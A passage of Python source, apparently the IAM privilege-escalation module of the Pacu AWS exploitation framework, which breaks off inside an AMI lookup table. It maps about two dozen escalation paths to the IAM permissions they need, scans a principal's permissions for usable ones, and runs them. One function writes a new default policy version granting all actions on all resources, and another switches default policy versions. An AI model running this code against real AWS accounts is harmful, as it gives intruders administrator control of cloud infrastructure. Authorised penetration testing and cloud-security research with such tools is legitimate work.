    #         "iam:PassRole": True,  # Pass the instance profile/role to the EC2 instance
    #         "ec2:RunInstances": True,  # Run the EC2 instance
    #         "iam:ListInstanceProfiles": False,  # Find an IP to pass
    #     },
    #     "CreateAccessKey": {
    #         "iam:CreateAccessKey": True,  # Create a new access key for some user
    #         "iam:ListUsers": False,  # Find a user to create a key for
    #     },
    #     "CreateLoginProfile": {
    #         "iam:CreateLoginProfile": True,  # Create a login profile for some user
    #         "iam:ListUsers": False,  # Find a user to create a profile for
    #     },
    #     "UpdateLoginProfile": {
    #         "iam:UpdateLoginProfile": True,  # Update the password for an existing login profile
    #         "iam:ListUsers": False,  # Find a user to update the password for
    #     },
    #     "AttachRolePolicy": {
    #         "iam:AttachRolePolicy": True,  # Attach an existing policy to a role
    #         "iam:ListRoles": False,  # Find a role to attach to
    #     },
    #     "PutRolePolicy": {
    #         "iam:PutRolePolicy": True,  # Alter an existing-attached inline role policy
    #         "iam:ListRolePolicies": False,  # Find a roles inline policies
    #     },
    #     "UpdateRolePolicyToAssumeIt": {
    #         "iam:UpdateAssumeRolePolicy": True,  # Update the roles AssumeRolePolicyDocument to allow the user to assume it
    #         "sts:AssumeRole": True,  # Assume the newly update role
    #         "iam:ListRoles": False,  # Find a role to assume
    #     },
    #     "PassExistingRoleToNewLambdaThenInvoke": {
    #         "iam:PassRole": True,  # Pass the role to the Lambda function
    #         "lambda:CreateFunction": True,  # Create a new Lambda function
    #         "lambda:InvokeFunction": True,  # Invoke the newly created function
    #         "iam:ListRoles": False,  # Find a role to pass
    #     },
    #     "PassExistingRoleToNewLambdaThenInvokeCrossAccount": {
    #         "iam:PassRole": True,  # Pass the role to the Lambda function
    #         "lambda:CreateFunction": True,  # Create a new Lambda function
    #         "lambda:AddPermission": True,  # Invoke the newly created function
    #         "iam:ListRoles": False,  # Find a role to pass
    #     },
    #     "PassExistingRoleToNewLambdaThenTriggerWithNewDynamo": {
    #         "iam:PassRole": True,  # Pass the role to the Lambda function
    #         "lambda:CreateFunction": True,  # Create a new Lambda function
    #         "lambda:CreateEventSourceMapping": True,  # Create a trigger for the Lambda function
    #         "dynamodb:CreateTable": True,  # Create a new table to use as the trigger ^
    #         "dynamodb:PutItem": True,  # Put a new item into the table to trigger the trigger
    #         "iam:ListRoles": False,  # Find a role to pass to the function
    #     },
    #     "PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo": {
    #         "iam:PassRole": True,  # Pass the role to the Lambda function
    #         "lambda:CreateFunction": True,  # Create a new Lambda function
    #         "lambda:CreateEventSourceMapping": True,  # Create a trigger for the Lambda function
    #         "dynamodb:ListStreams": False,  # Find existing streams
    #         "dynamodb:PutItem": False,  # Put a new item into the table to trigger the trigger
    #         "dynamodb:DescribeTables": False,  # Find an existing DynamoDB table
    #         "iam:ListRoles": False,  # Find a role to pass to the function
    #     },
    #     "PassExistingRoleToNewGlueDevEndpoint": {
    #         "iam:PassRole": True,  # Pass the role to the Glue Dev Endpoint
    #         "glue:CreateDevEndpoint": True,  # Create the new Glue Dev Endpoint
    #         "glue:GetDevEndpoint": True,  # Get the public address of it after creation
    #         "iam:ListRoles": False,  # Find a role to pass to the endpoint
    #     },
    #     "UpdateExistingGlueDevEndpoint": {
    #         "glue:UpdateDevEndpoint": True,  # Update the associated SSH key for the Glue endpoint
    #         "glue:DescribeDevEndpoints": False,  # Find a dev endpoint to update
    #     },
    #     "PassExistingRoleToNewCloudFormation": {
    #         "iam:PassRole": True,  # Pass role to the new stack
    #         "cloudformation:CreateStack": True,  # Create the stack
    #         "cloudformation:DescribeStacks": False,  # Fetch the values returned from the stack. Most likely needed, but possibly not
    #         "iam:ListRoles": False,  # Find roles to pass to the stack
    #     },
    #     "PassExistingRoleToNewDataPipeline": {
    #         "iam:PassRole": True,  # Pass roles to the Pipeline
    #         "datapipeline:CreatePipeline": True,  # Create the pipieline
    #         "datapipeline:PutPipelineDefinition": True,  # Update the pipeline to do something
    #         "iam:ListRoles": False,  # List roles to pass to the pipeline
    #     },
    #     "EditExistingLambdaFunctionWithRole": {
    #         "lambda:UpdateFunctionCode": True,  # Edit existing Lambda functions
    #         "lambda:ListFunctions": False,  # Find existing Lambda functions
    #         "lambda:InvokeFunction": False,  # Invoke it afterwards
    #     },
    #     "PassExistingRoleToNewCodeStarProject": {
    #         "codestar:CreateProject": True,  # Create the CodeStar project
    #         "iam:PassRole": True,  # Pass the service role to CodeStar
    #     },
    # }

    user_escalation_methods = {
        "AddUserToGroup": {
            "iam:addusertogroup": True, 
            "iam:listgroups": False
        },
        "AttachGroupPolicy": {
            "iam:attachgrouppolicy": True,
            "iam:listgroupsforuser": False,
        },
        "AttachRolePolicy": {
            "iam:attachrolepolicy": True,
            "iam:listroles": False,
            "sts:assumerole": True,
        },
        "AttachUserPolicy": {
            "iam:attachuserpolicy": True, 
            "iam:listusers": False
        },
        "CodeStarCreateProjectFromTemplate": {
            "codestar:createprojectfromtemplate": True
        },
        "CodeStarCreateProjectThenAssociateTeamMember": {
            "codestar:associateteammember": True,
            "codestar:createproject": True,
        },
        "CreateAccessKey": {
            "iam:createaccesskey": True,
            "iam:listusers": False
        },
        "CreateEC2WithExistingIP": {
            "ec2:runinstances": True,
            "iam:listinstanceprofiles": False,
            "iam:passrole": True,
        },
        "CreateLoginProfile": {
            "iam:createloginprofile": True, 
            "iam:listusers": False
        },
        "CreateNewPolicyVersion": {
            "iam:createpolicyversion": True,
            "iam:listattachedgrouppolicies": False,
            "iam:listattachedrolepolicies": False,
            "iam:listattacheduserpolicies": False,
            "iam:listgroupsforuser": False,
        },
        "EditExistingLambdaFunctionWithRole": {
            "lambda:invokefunction": False,
            "lambda:listfunctions": False,
            "lambda:updatefunctioncode": True,
        },
        "PassExistingRoleToNewCloudFormation": {
            "cloudformation:createstack": True,
            "cloudformation:describestacks": False,
            "iam:listroles": False,
            "iam:passrole": True,
        },
        "PassExistingRoleToNewCodeStarProject": {
            "codestar:createproject": True,
            "iam:passrole": True,
        },
        "PassExistingRoleToNewDataPipeline": {
            "datapipeline:createpipeline": True,
            "datapipeline:putpipelinedefinition": True,
            "iam:listroles": False,
            "iam:passrole": True,
        },
        "PassExistingRoleToNewGlueDevEndpoint": {
            "glue:createdevendpoint": True,
            "glue:getdevendpoint": True,
            "iam:listroles": False,
            "iam:passrole": True,
        },
        "PassExistingRoleToNewLambdaThenInvoke": {
            "iam:listroles": False,
            "iam:passrole": True,
            "lambda:createfunction": True,
            "lambda:invokefunction": True,
        },
        "PassExistingRoleToNewLambdaThenInvokeCrossAccount": {
            "iam:listroles": False,
            "iam:passrole": True,
            "lambda:addpermission": True,
            "lambda:createfunction": True,
        },
        "PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo": {
            "dynamodb:describetables": False,
            "dynamodb:liststreams": False,
            "dynamodb:putitem": False,
            "iam:listroles": False,
            "iam:passrole": True,
            "lambda:createeventsourcemapping": True,
            "lambda:createfunction": True,
        },
        "PassExistingRoleToNewLambdaThenTriggerWithNewDynamo": {
            "dynamodb:createtable": True,
            "dynamodb:putitem": True,
            "iam:listroles": False,
            "iam:passrole": True,
            "lambda:createeventsourcemapping": True,
            "lambda:createfunction": True,
        },
        "PutGroupPolicy": {
            "iam:listgrouppolicies": False, 
            "iam:putgrouppolicy": True
        },
        "PutRolePolicy": {
            "iam:listrolepolicies": False,
            "iam:putrolepolicy": True,
            "sts:assumerole": True,
        },
        "PutUserPolicy": {
            "iam:listuserpolicies": False, 
            "iam:putuserpolicy": True
        },
        "SetExistingDefaultPolicyVersion": {
            "iam:listattachedgrouppolicies": False,
            "iam:listattachedrolepolicies": False,
            "iam:listattacheduserpolicies": False,
            "iam:listgroupsforuser": False,
            "iam:listpolicyversions": False,
            "iam:setdefaultpolicyversion": True,
        },
        "UpdateExistingGlueDevEndpoint": {
            "glue:describedevendpoints": False,
            "glue:updatedevendpoint": True,
        },
        "UpdateLoginProfile": {
            "iam:listusers": False, 
            "iam:updateloginprofile": True
        },
        "UpdateRolePolicyToAssumeIt": {
            "iam:listroles": False,
            "iam:updateassumerolepolicy": True,
            "sts:assumerole": True,
        },
    }
    role_escalation_methods = {
        "AttachRolePolicy": {
            "iam:attachrolepolicy": True, 
            "iam:listroles": False
        },
        "CreateAccessKey": {
            "iam:createaccesskey": True, 
            "iam:listusers": False
        },
        "CreateEC2WithExistingIP": {
            "ec2:runinstances": True,
            "iam:listinstanceprofiles": False,
            "iam:passrole": True,
        },
        "CreateLoginProfile": {
            "iam:createloginprofile": True, 
            "iam:listusers": False
        },
        "CreateNewPolicyVersion": {
            "iam:createpolicyversion": True,
            "iam:listattachedgrouppolicies": False,
            "iam:listattachedrolepolicies": False,
            "iam:listattacheduserpolicies": False,
            "iam:listgroupsforuser": False,
        },
        "EditExistingLambdaFunctionWithRole": {
            "lambda:invokefunction": False,
            "lambda:listfunctions": False,
            "lambda:updatefunctioncode": True,
        },
        "PassExistingRoleToNewCloudFormation": {
            "cloudformation:createstack": True,
            "cloudformation:describestacks": False,
            "iam:listroles": False,
            "iam:passrole": True,
        },
        "PassExistingRoleToNewCodeStarProject": {
            "codestar:createproject": True,
            "iam:passrole": True,
        },
        "PassExistingRoleToNewDataPipeline": {
            "datapipeline:createpipeline": True,
            "datapipeline:putpipelinedefinition": True,
            "iam:listroles": False,
            "iam:passrole": True,
        },
        "PassExistingRoleToNewGlueDevEndpoint": {
            "glue:createdevendpoint": True,
            "glue:getdevendpoint": True,
            "iam:listroles": False,
            "iam:passrole": True,
        },
        "PassExistingRoleToNewLambdaThenInvoke": {
            "iam:listroles": False,
            "iam:passrole": True,
            "lambda:createfunction": True,
            "lambda:invokefunction": True,
        },
        "PassExistingRoleToNewLambdaThenInvokeCrossAccount": {
            "iam:listroles": False,
            "iam:passrole": True,
            "lambda:addpermission": True,
            "lambda:createfunction": True,
        },
        "PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo": {
            "dynamodb:describetables": False,
            "dynamodb:liststreams": False,
            "dynamodb:putitem": False,
            "iam:listroles": False,
            "iam:passrole": True,
            "lambda:createeventsourcemapping": True,
            "lambda:createfunction": True,
        },
        "PassExistingRoleToNewLambdaThenTriggerWithNewDynamo": {
            "dynamodb:createtable": True,
            "dynamodb:putitem": True,
            "iam:listroles": False,
            "iam:passrole": True,
            "lambda:createeventsourcemapping": True,
            "lambda:createfunction": True,
        },
        "PutRolePolicy": {
            "iam:listrolepolicies": False, 
            "iam:putrolepolicy": True
        },
        "SetExistingDefaultPolicyVersion": {
            "iam:listattachedgrouppolicies": False,
            "iam:listattachedrolepolicies": False,
            "iam:listattacheduserpolicies": False,
            "iam:listgroupsforuser": False,
            "iam:listpolicyversions": False,
            "iam:setdefaultpolicyversion": True,
        },
        "UpdateExistingGlueDevEndpoint": {
            "glue:describedevendpoints": False,
            "glue:updatedevendpoint": True,
        },
        "UpdateLoginProfile": {
            "iam:listusers": False, 
            "iam:updateloginprofile": True
        },
        "UpdateRolePolicyToAssumeIt": {
            "iam:listroles": False,
            "iam:updateassumerolepolicy": True,
            "sts:assumerole": True,
        },
    }
    # Check if this is an offline scan
    if args.offline is True:
        potential_methods = {}
        folder = args.folder

        if args.folder is None:
            folder = "{}/confirmed_permissions/".format(downloads_dir())
            print(
                "No --folder argument passed to offline mode, using the default: {}\n".format(
                    folder
                )
            )
            if os.path.isdir(folder) is False:
                print(
                    "{} not found! Maybe you have not run {} yet...\n".format(
                        folder, module_info["prerequisite_modules"][0]
                    )
                )
                if (
                    fetch_data(
                        ["All users/roles permissions"],
                        module_info["prerequisite_modules"][0],
                        "--all-users --all-roles",
                    )
                    is False
                ):
                    print("Pre-req module not run. Exiting...")
                    return

        try:
            files = os.listdir(folder)
            for file_name in files:
                user = None
                role = None

                with open(
                    "{}{}".format(folder, file_name), "r"
                ) as confirmed_permissions_file:
                    if file_name.startswith("user-"):
                        user = json.load(confirmed_permissions_file)
                    elif file_name.startswith("role-"):
                        role = json.load(confirmed_permissions_file)

                name = (
                    "(User) {}".format(user["UserName"])
                    if user
                    else "(Role) {}".format(role["RoleName"])
                )

                if user:
                    if "*" in user["Permissions"]["Allow"] and user["Permissions"][
                        "Allow"
                    ]["*"]["Resources"] == [
                        "*"
                    ]:  # If the user is already an admin, skip them
                        print(
                            "  {} already has administrator permissions.".format(name)
                        )
                        continue

                    potential_methods[name] = []

                    for method in user_escalation_methods.keys():
                        is_possible = True

                        for permission in user_escalation_methods[method]:
                            if (
                                user_escalation_methods[method][permission] is True
                            ):  # If the permission is required for the method
                                permission = permission.lower()
                                if permission in user["Permissions"]["Deny"]:
                                    # Check for the custom deny condition which may
                                    # mean it is not actually denied for all resources
                                    if "IfResourcesNotIn" in str(
                                        user["Permissions"]["Deny"][permission][
                                            "Conditions"
                                        ]
                                    ):
                                        pass
                                    else:
                                        is_possible = False
                                        break

                                if (
                                    permission not in user["Permissions"]["Allow"]
                                ):  # and the user doesn't have it allowed
                                    is_possible = False
                                    break

                        if is_possible is True:
                            potential_methods[name].append(method)
                elif role:
                    if "*" in role["Permissions"]["Allow"] and role["Permissions"][
                        "Allow"
                    ]["*"]["Resources"] == [
                        "*"
                    ]:  # If the role is already an admin, skip them
                        print(
                            "  {} already has administrator permissions.".format(name)
                        )
                        continue

                    potential_methods[name] = []

                    for method in role_escalation_methods.keys():
                        is_possible = True

                        for permission in role_escalation_methods[method]:
                            if (
                                role_escalation_methods[method][permission] is True
                            ):  # If the permission is required for the method
                                permission = permission.lower()
                                if permission in role["Permissions"]["Deny"]:
                                    if "IfResourcesNotIn" in str(
                                        role["Permissions"]["Deny"][permission][
                                            "Conditions"
                                        ]
                                    ):
                                        pass
                                    else:
                                        is_possible = False
                                        break

                                if (
                                    permission not in role["Permissions"]["Allow"]
                                ):  # and the role doesn't have it allowed
                                    is_possible = False
                                    break

                        if is_possible is True:
                            potential_methods[name].append(method)

            potential_methods = remove_empty_from_dict(potential_methods)
            print(potential_methods)

            now = time.time()
            with save(
                "downloads/offline_privesc_scan_{}.json".format(session.name, now), "w+"
            ) as f:
                json.dump(potential_methods, f, indent=2, default=str)

            summary_data["offline"] = {
                "scanned_dir": folder,
                "output_file": "offline_privesc_scan_{}.json".format(session.name, now),
            }
            return summary_data

        except Exception as e:
            print("Error accessing folder {}: {}\nExiting...".format(folder, e))
            return

    # It is online if it has reached here

    target = key_info()

    # Preliminary check to see if these permissions have already been enumerated in this session
    if "Permissions" in target and "Allow" in target["Permissions"]:
        # Have any permissions been enumerated?
        if target["Permissions"]["Allow"] == {} and target["Permissions"]["Deny"] == {}:
            print("No permissions detected yet.")
            if (
                fetch_data(
                    ["Current User/Role", "Permissions"],
                    module_info["prerequisite_modules"][0],
                    "",
                )
                is False
            ):
                print("Pre-req module not run successfully. Exiting...")
                return
            target = key_info()

        # Are they an admin already?
        if "*" in target["Permissions"]["Allow"] and target["Permissions"]["Allow"][
            "*"
        ]["Resources"] == ["*"]:
            print(
                "You already have admin permissions (Action: * on Resource: *)! Exiting..."
            )
            return

        for perm in all_perms:
            for effect in ["Allow", "Deny"]:
                if perm in target["Permissions"][effect]:
                    checked_perms[effect][perm] = target["Permissions"][effect][perm]
                else:
                    for target_perm in target["Permissions"][effect].keys():
                        if "*" in target_perm:
                            pattern = re.compile(target_perm.replace("*", ".*"))
                            if pattern.search(perm) is not None:
                                checked_perms[effect][perm] = target["Permissions"][
                                    effect
                                ][target_perm]

    checked_methods = {"Potential": [], "Confirmed": []}

    # Ditch each escalation method that has been confirmed not to be possible

    if target["UserName"]:  # If they are a user
        print("Escalation methods for current user:")
        for method in user_escalation_methods.keys():
            potential = True
            confirmed = True

            for perm in user_escalation_methods[method]:
                if (
                    user_escalation_methods[method][perm] is True
                ):  # If this permission is required
                    if (
                        "PermissionsConfirmed" in target
                        and target["PermissionsConfirmed"] is True
                    ):  # If permissions are confirmed
                        if (
                            perm not in checked_perms["Allow"]
                        ):  # If this permission isn't Allowed, then this method won't work
                            potential = confirmed = False
                            break
                        elif (
                            perm in checked_perms["Deny"]
                            and perm in checked_perms["Allow"]
                        ):  # Permission is both Denied and Allowed, leave as potential, not confirmed
                            confirmed = False

                    else:
                        if (
                            perm in checked_perms["Allow"]
                            and perm in checked_perms["Deny"]
                        ):  # If it is Allowed and Denied, leave as potential, not confirmed
                            confirmed = False
                        elif (
                            perm not in checked_perms["Allow"]
                            and perm in checked_perms["Deny"]
                        ):  # If it isn't Allowed and IS Denied
                            potential = confirmed = False
                            break
                        elif (
                            perm not in checked_perms["Allow"]
                            and perm not in checked_perms["Deny"]
                        ):  # If its not Allowed and not Denied
                            confirmed = False

            if confirmed is True:
                print("  CONFIRMED: {}".format(method))
                checked_methods["Confirmed"].append(method)

            elif potential is True:
                print("  POTENTIAL: {}".format(method))
                checked_methods["Potential"].append(method)
    elif target["RoleName"]:
        print("Escalation methods for current role:")
        for method in role_escalation_methods.keys():
            potential = True
            confirmed = True

            for perm in role_escalation_methods[method]:
                if (
                    role_escalation_methods[method][perm] is True
                ):  # If this permission is required
                    if (
                        "PermissionsConfirmed" in target
                        and target["PermissionsConfirmed"] is True
                    ):  # If permissions are confirmed
                        if (
                            perm not in checked_perms["Allow"]
                        ):  # If this permission isn't Allowed, then this method won't work
                            potential = confirmed = False
                            break
                        elif (
                            perm in checked_perms["Deny"]
                            and perm in checked_perms["Allow"]
                        ):  # Permission is both Denied and Allowed, leave as potential, not confirmed
                            confirmed = False

                    else:
                        if (
                            perm in checked_perms["Allow"]
                            and perm in checked_perms["Deny"]
                        ):  # If it is Allowed and Denied, leave as potential, not confirmed
                            confirmed = False
                        elif (
                            perm not in checked_perms["Allow"]
                            and perm in checked_perms["Deny"]
                        ):  # If it isn't Allowed and IS Denied
                            potential = confirmed = False
                            break
                        elif (
                            perm not in checked_perms["Allow"]
                            and perm not in checked_perms["Deny"]
                        ):  # If its not Allowed and not Denied
                            confirmed = False

            if confirmed is True:
                print("  CONFIRMED: {}".format(method))
                checked_methods["Confirmed"].append(method)

            elif potential is True:
                print("  POTENTIAL: {}".format(method))
                checked_methods["Potential"].append(method)

    # If --scan-only wasn't passed in and there is at least one Confirmed or Potential method to try
    if args.scan_only is False and (
        len(checked_methods["Confirmed"]) > 0 or len(checked_methods["Potential"]) > 0
    ):
        escalated = False
        # Attempt confirmed methods first
        methods = globals()

        if len(checked_methods["Confirmed"]) > 0:
            print("Attempting confirmed privilege escalation methods...\n")

            for confirmed_method in checked_methods["Confirmed"]:
                try:
                    response = methods[confirmed_method](
                        pacu_main, print, input, fetch_data
                    )
                except Exception as error:
                    print(
                        "Uncaught error, counting this method as a fail: {}".format(
                            error
                        )
                    )
                    response = False

                if response is False:
                    print("  Method failed. Trying next potential method...")
                else:
                    escalated = True
                    break

            if escalated is False:
                print("No confirmed privilege escalation methods worked.")

        else:
            print("No confirmed privilege escalation methods were found.")

        if (
            escalated is False and len(checked_methods["Potential"]) > 0
        ):  # If confirmed methods did not work out
            print("Attempting potential privilege escalation methods...")

            for potential_method in checked_methods["Potential"]:
                try:
                    response = methods[potential_method](
                        pacu_main, print, input, fetch_data
                    )
                except Exception as error:
                    print(
                        "Uncaught error, counting this method as a fail: {}".format(
                            error
                        )
                    )
                    response = False

                if response is False:
                    print("  Method failed. Trying next potential method...")
                else:
                    escalated = True
                    break

            if escalated is False:
                print("No potential privilege escalation methods worked.")
        summary_data["success"] = escalated
    elif (
        len(checked_methods["Confirmed"]) == 0
        and len(checked_methods["Potential"]) == 0
    ):
        print("  None found")
        summary_data["success"] = False

    return summary_data


def summary(data, pacu_main):
    print()
    if data["scan_only"]:
        return "  Scan Complete"
    elif "offline" in data and data["offline"]:
        return "  Completed offline scan of:\n    ./{}\n\n  Results stored in:\n    {}".format(
            data["offline"]["scanned_dir"], data["offline"]["output_file"]
        )
    else:
        if "success" in data and data["success"]:
            out = "  Privilege escalation was successful"
        else:
            out = "  Privilege escalation was not successful"
    return out


# Functions for individual privesc methods
# Their names match their key names under the user_escalation_methods/role_escalation_methods objects so I can invoke a method by running globals()[method]()
# Each of these will return True if successful and False if failed


def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method CreateNewPolicyVersion...\n")
    client = pacu_main.get_boto3_client("iam")

    policy_arn = input(
        "    Is there a specific policy you want to target? Enter its ARN now (just hit enter to automatically figure out a valid policy to target): "
    )

    if not policy_arn:
        print("    No policy ARN entered, now finding a valid policy...\n")

        active_aws_key = session.get_active_aws_key(pacu_main.database)

        if active_aws_key.policies:
            all_user_policies = active_aws_key.policies
            valid_user_policies = []

            for policy in all_user_policies:
                if (
                    "PolicyArn" in policy.keys()
                    and "arn:aws:iam::aws" not in policy["PolicyArn"]
                ):
                    valid_user_policies.append(deepcopy(policy))

            print(
                "      {} valid user-attached policy(ies) found...\n".format(
                    len(valid_user_policies)
                )
            )

            if len(valid_user_policies) > 1:
                for i in range(0, len(valid_user_policies)):
                    print(
                        "        [{}] {}".format(
                            i, valid_user_policies[i]["PolicyName"]
                        )
                    )

                while not policy_arn:
                    choice = input("      Choose an option: ").strip()
                    try:
                        choice = int(choice)
                        policy_arn = valid_user_policies[choice]["PolicyArn"]
                    except Exception as e:
                        policy_arn = ""
                        print("    Invalid option. Try again.")

            elif len(valid_user_policies) == 1:
                policy_arn = valid_user_policies[0]["PolicyArn"]

            else:
                print("      No valid user-attached policies found.")

        # If no valid user-attached policies found, try groups
        if active_aws_key.groups and not policy_arn:
            groups = active_aws_key.groups
            valid_group_policies = []

            for group in groups:
                for policy in group["Policies"]:
                    if (
                        "PolicyArn" in policy
                        and "arn:aws:iam::aws" not in policy["PolicyArn"]
                    ):
                        valid_group_policies.append(deepcopy(policy))

            print(
                "      {} valid group-attached policy(ies) found.\n".format(
                    len(valid_group_policies)
                )
            )

            if len(valid_group_policies) > 1:
                for i in range(0, len(valid_group_policies)):
                    print(
                        "        [{}] {}".format(
                            i, valid_group_policies[i]["PolicyName"]
                        )
                    )

                while not policy_arn:
                    choice = input("      Choose an option: ")
                    try:
                        choice = int(choice)
                        policy_arn = valid_group_policies[choice]["PolicyArn"]
                    except Exception as e:
                        policy_arn = ""
                        print("    Invalid option. Try again.")

            elif len(valid_group_policies) == 1:
                policy_arn = valid_group_policies[0]["PolicyArn"]

            else:
                print("      No valid group-attached policies found.")

        # If it looks like permissions haven't been/attempted to be enumerated
        if not policy_arn:
            fetch = input(
                '    It looks like the current users confirmed permissions have not been enumerated yet, so no valid policy can be found, enter "y" to run the iam__enum_permissions module to enumerate the required information, enter the ARN of a policy to create a new version for, or "n" to skip this privilege escalation module ([policy_arn]/y/n): '
            )
            if fetch.strip().lower() == "n":
                print("    Cancelling CreateNewPolicyVersion...")
                return False

            elif fetch.strip().lower() == "y":
                if (
                    fetch_data(
                        None, module_info["prerequisite_modules"][0], "", force=True
                    )
                    is False
                ):
                    print("Pre-req module not run successfully. Skipping method...")
                    return False
                return CreateNewPolicyVersion(pacu_main, print, input, fetch_data)

            else:  # It is an ARN
                policy_arn = fetch

    if (
        not policy_arn
    ):  # If even after everything else, there is still no policy: Ask the user to give one or exit
        policy_arn = input(
            "  All methods of enumerating a valid policy have failed. Manually enter in a policy ARN to use, or press enter to skip to the next privilege escalation method: "
        )
        if not policy_arn:
            return False

    try:
        response = client.create_policy_version(
            PolicyArn=policy_arn,
            PolicyDocument='{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}',
            SetAsDefault=True,
        )["PolicyVersion"]

        if (
            "VersionId" in response
            and "IsDefaultVersion" in response
            and "CreateDate" in response
        ):
            print(
                '    Privilege escalation successful using method CreateNewPolicyVersion!\n\n  The current user is now an administrator ("*" permissions on "*" resources).\n'
            )
            return True

        else:
            print(
                '    Something is wrong with the response when attempting to create a new policy version. It should contain the keys "VersionId", "IsDefaultVersion", and "CreateDate". We received:\n      {}'.format(
                    response
                )
            )
            print("      Reporting this privilege escalation attempt as a fail...")
            return False

    except Exception as e:
        print(
            "   Failed to create new policy version on policy {}...".format(policy_arn)
        )
        print("     Error given: {}".format(e))
        return False


def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method SetExistingDefaultPolicyVersion...\n")
    client = pacu_main.get_boto3_client("iam")

    policy_arn = input(
        "    Is there a specific policy you want to target? Enter its ARN now (just hit enter to automatically figure out a list of valid policies to check): "
    )

    target_policy = {}
    all_potential_policies = []
    potential_user_policies = []
    potential_group_policies = []

    if not policy_arn:
        print("    No policy ARN entered, now finding a valid policy...\n")

        active_aws_key = session.get_active_aws_key(pacu_main.database)

        if active_aws_key.policies:
            all_user_policies = active_aws_key.policies

            for policy in all_user_policies:
                if (
                    "PolicyArn" in policy.keys()
                    and "arn:aws:iam::aws" not in policy["PolicyArn"]
                ):
                    potential_user_policies.append(deepcopy(policy))

        # If no valid user-attached policies found, try groups
        if active_aws_key.groups:
            groups = active_aws_key.groups

            for group in groups:
                for policy in group["Policies"]:
                    if (
                        "PolicyArn" in policy
                        and "arn:aws:iam::aws" not in policy["PolicyArn"]
                    ):
                        potential_group_policies.append(deepcopy(policy))

        # If it looks like permissions haven't been/attempted to be enumerated
        if not policy_arn and active_aws_key.allow_permissions == {}:
            fetch = input(
                '    It looks like the current users confirmed permissions have not been enumerated yet, so no valid policy can be found, enter "y" to run the iam__enum_permissions module to enumerate the required information, enter the ARN of a policy to create a new version for, or "n" to skip this privilege escalation module ([policy_arn]/y/n): '
            )
            if fetch.strip().lower() == "n":
                print("    Cancelling SetExistingDefaultPolicyVersion...\n")
                return False

            elif fetch.strip().lower() == "y":
                if (
                    fetch_data(
                        None, module_info["prerequisite_modules"][0], "", force=True
                    )
                    is False
                ):
                    print("Pre-req module not run successfully. Skipping method...\n")
                    return False
                return SetExistingDefaultPolicyVersion(
                    pacu_main, print, input, fetch_data
                )

            else:  # It is an ARN
                policy_arn = fetch

    if not policy_arn:  # If no policy_arn yet, check potential group and user policies
        policies_with_versions = []
        all_potential_policies.extend(potential_user_policies)
        all_potential_policies.extend(potential_group_policies)

        for policy in all_potential_policies:
            response = client.list_policy_versions(PolicyArn=policy["PolicyArn"])
            versions = response["Versions"]
            while response["IsTruncated"]:
                response = client.list_policy_versions(
                    PolicyArn=policy["PolicyArn"], Marker=response["Marker"]
                )
                versions.extend(response["Versions"])
            if len(versions) > 1:
                policy["Versions"] = versions
                policies_with_versions.append(policy)
        if len(policies_with_versions) > 1:
            print(
                "Found {} policy(ies) with multiple versions. Choose one below.\n".format(
                    len(policies_with_versions)
                )
            )
            for i in range(0, len(policies_with_versions)):
                print(
                    "  [{}] {}: {} versions".format(
                        i,
                        policies_with_versions[i]["PolicyName"],
                        len(policies_with_versions[i]["Versions"]),
                    )
                )
            choice = input("Choose an option: ")
            target_policy = policies_with_versions[choice]
        elif len(policies_with_versions) == 1:
            target_policy = policies_with_versions[0]
    else:
        while (
            policy_arn
        ):  # Run until we get a policy with multiple versions or they cancel
            target_policy["PolicyArn"] = policy_arn
            response = client.list_policy_versions(PolicyArn=policy_arn)
            versions = response["Versions"]
            while response.get("IsTruncated"):
                response = client.list_policy_versions(
                    PolicyArn=policy_arn, Marker=response["Marker"]
                )
                versions.extend(response["Versions"])
            target_policy["Versions"] = versions
            if len(versions) == 1:
                policy_arn = input(
                    "  The policy ARN you supplied only has one valid version. Enter another policy ARN to try again, or press enter to skip to the next privilege escalation method: "
                )
                if not policy_arn:
                    return False
            else:
                break

    if (
        not target_policy
    ):  # If even after everything else, there is still no policy: exit
        print(
            "  All methods of enumerating a valid policy have failed. Skipping to the next privilege escalation method...\n"
        )
        return False

    print("Now printing the policy document for each version of the target policy...\n")
    for version in target_policy["Versions"]:
        version_document = client.get_policy_version(
            PolicyArn=target_policy["PolicyArn"], VersionId=version["VersionId"]
        )["PolicyVersion"]["Document"]
        if version["IsDefaultVersion"] is True:
            print("Version (default): {}\n".format(version["VersionId"]))
        else:
            print("Version: {}\n".format(version["VersionId"]))

        print(version_document)
        print()
    new_version = input(
        "What version would you like to switch to (example: v1)? Just press enter to keep it as the default: "
    )
    if not new_version:
        print("  Keeping the default version as is.\n")
        return False

    try:
        client.set_default_policy_version(
            PolicyArn=target_policy["PolicyArn"], VersionId=new_version
        )
        print(
            "  Successfully set the default policy version to {}!\n".format(new_version)
        )
        return True
    except Exception as error:
        print("  Failed to set a new default policy version: {}\n".format(error))
        return False


def CreateEC2WithExistingIP(pacu_main: "Main", print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method CreateEC2WithExistingIP...\n")

    regions = pacu_main.get_regions("ec2")
    region = None

    if len(regions) > 1:
        print("  Found multiple valid regions. Choose one below.\n")
        for i in range(0, len(regions)):
            print("  [{}] {}".format(i, regions[i]))
        choice = input("What region do you want to launch the EC2 instance in? ")
        region = regions[int(choice)]
    elif len(regions) == 1:
        region = regions[0]
    else:
        while not region:
            all_ec2_regions = pacu_main.get_regions("ec2", check_session=False)
            region = input(
                "  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: "
            )
            if not region:
                return False
            elif region not in all_ec2_regions:
                print(
                    "    Region {} is not a valid EC2 region. Please choose a valid region. Valid EC2 regions include:\n".format(
                        region
                    )
                )
                print(all_ec2_regions)
                region = None

    amis_by_region = {
        "us-east-2": "ami-8c122be9",
        "us-east-1": "ami-b70554c8",
        "us-west-1": "ami-e0ba5c83",
        "us-west-2": "ami-a9d09ed1",
        "ap-northeast-1": "ami-e99f4896",
        "ap-northeast-2": "ami-afd86dc1",
        "ap-south-1": "ami-d783a9b8",
        "ap-southeast-1": "ami-05868579",
        "ap-southeast-2": "ami-39f8215b",
        "ca-central-1": "ami-0ee86a6a",
